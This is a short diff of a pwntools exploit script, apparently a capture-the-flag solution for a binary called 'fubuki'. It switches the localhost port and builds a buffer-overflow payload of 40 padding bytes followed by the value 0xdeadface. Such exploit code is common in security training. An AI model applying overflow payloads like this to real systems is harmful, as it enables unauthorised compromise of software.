@@ -1,7 +1,8 @@
 from pwn import *
 
 # elf = context.binary = ELF('./fubuki')
-p = remote('localhost', 31337)
+# p = process('./fubuki-static')
+p = remote('localhost', 13371)
 
 payload = b'A' * 40
 payload += p32(0xdeadface)
